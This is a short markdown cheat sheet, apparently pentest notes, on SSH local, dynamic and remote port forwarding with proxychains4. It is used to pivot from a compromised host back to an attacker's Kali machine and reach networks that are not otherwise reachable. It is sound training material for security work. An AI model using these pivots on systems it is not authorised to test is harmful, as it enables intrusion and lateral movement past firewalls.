# SSH Tunneling

## Local Port Forwarding

Local SSH tunnel from `$OWNED_IP1` to some `EXTERNAL_IP` (run this from `${OWNED_IP0}`).
```
ssh -N -L 0.0.0.0:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${USER}@${OWNED_IP1}
```
This will allow traffic to go `${ATTACKER_IP} <--> ${OWNED_IP}:${OWNED_PORT} <--> ${EXTERNAL_IP}:${EXTERNAL_PORT}` 

## Dynamic Port Forwarding

If we want to be able to port-scan or otherwise interact with multiple ports of targets not directly reachable from our network,
we can use `proxychains4` with OpenSSH's dynamic port forward option.

With the following, OpenSSH opens a SOCKS proxy server:

```
ssh -N -D 0.0.0.0:${OWNED_PORT0} ${USER}@${OWNED_IP1}
```

To make sure packages are sent in a compatible manner, we use `proxychains4`.
the default config is found in `/etc/proxychains4.conf`, but we can also specify a config file with `-f $pathToConfig`.

a config could be to add to a `proxychains4.conf`:

```
socks5 	${OWNED_IP0} ${OWNED_PORT0} 
```

Now, we can do eg. a call with smbclient like so:

```
proxychains4 -f proxychains4.conf smbclient ...
```
The trick is to use whatever tool you are calling with the same parameters you would otherwise with regards to IPs and ports, and just let proxychains handle the proxying.

## Remote Port Forwarding

(pre-req): This requires that we've setup an SSH server on our kali machine with:
```
sudo systemctl start ssh
```

If the firewall setup doesn't allow us to SSH from `${OWNED_IP}`, which we have compromised, it can make sense to remote port forward back to our `${ATTACKER_IP}` with (run from `${OWNED_IP0}`):
```
ssh -N -R 127.0.0.1:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
```
Now, we can interact with `${EXTERNAL_IP}:${EXTERNAL_PORT}` via `127.0.0.1:${OWNED_PORT0}`.


## Remote Dynamic Port Forwarding
(pre-req): This requires that we've setup an SSH server on our kali machine with:
```
sudo systemctl start ssh
```

From `${OWNED_IP}`, we can also do remote dynamic port forwarding with:

```
ssh -N -R ${PROXYCHAINS_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
```
For this to work with `proxychains4`, we have to add the following to our config:

```
socks4 127.0.0.1 ${PROXYCHAINS_PORT}
```

Now, we can again interact with targets reachable from `${OWNED_IP}` from `${ATTACKER_IP}` by prefixing with `proxychains4` and then setting whatever IP/Port we want to hit. 

